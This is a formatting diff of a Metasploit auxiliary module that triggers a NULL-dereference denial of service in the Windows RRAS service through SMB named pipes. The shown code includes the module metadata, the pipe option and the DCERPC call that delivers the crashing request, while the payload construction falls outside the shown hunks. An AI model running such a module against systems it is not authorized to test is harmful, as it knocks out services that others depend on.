@@ -1,49 +1,45 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 require 'msf/core'
 
-
 class MetasploitModule < Msf::Auxiliary
-
-
   include Msf::Exploit::Remote::DCERPC
   include Msf::Exploit::Remote::SMB::Client
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Microsoft RRAS InterfaceAdjustVLSPointers NULL Dereference',
-      'Description'    => %q{
-        This module triggers a NULL dereference in svchost.exe on
-      all current versions of Windows that run the RRAS service. This
-      service is only accessible without authentication on Windows XP
-      SP1 (using the SRVSVC pipe).
-      },
+                      'Name'           => 'Microsoft RRAS InterfaceAdjustVLSPointers NULL Dereference',
+                      'Description'    => %q{
+                        This module triggers a NULL dereference in svchost.exe on
+                      all current versions of Windows that run the RRAS service. This
+                      service is only accessible without authentication on Windows XP
+                      SP1 (using the SRVSVC pipe).
+                      },
 
-      'Author'         => [ 'hdm' ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
-          [ 'OSVDB', '64340'],
+                      'Author'         => [ 'hdm' ],
+                      'License'        => MSF_LICENSE,
+                      'References'     =>
+                        [
+                          [ 'OSVDB', '64340']
 
-        ],
-      'Actions'     =>
-        [
-          ['Attack'],
-        ],
-      'DefaultAction' => 'Attack',
-      'DisclosureDate' => 'Jun 14 2006'
-    ))
+                        ],
+                      'Actions' =>
+                        [
+                          ['Attack']
+                        ],
+                      'DefaultAction' => 'Attack',
+                      'DisclosureDate' => 'Jun 14 2006'))
 
     register_options(
       [
-        OptString.new('SMBPIPE', [ true,  "The pipe name to use (ROUTER, SRVSVC)", 'ROUTER']),
-      ], self.class)
-
+        OptString.new('SMBPIPE', [ true, "The pipe name to use (ROUTER, SRVSVC)", 'ROUTER'])
+      ], self.class
+    )
   end
 
   def run
@@ -65,14 +61,11 @@ class MetasploitModule < Msf::Auxiliary
         dcerpc.call(0x0C, stb)
       rescue Rex::Proto::DCERPC::Exceptions::NoResponse
       rescue => e
-        if e.to_s !~ /STATUS_PIPE_DISCONNECTED/
-          raise e
-        end
+        raise e if e.to_s !~ /STATUS_PIPE_DISCONNECTED/
       end
 
     end
 
     disconnect
   end
-
 end
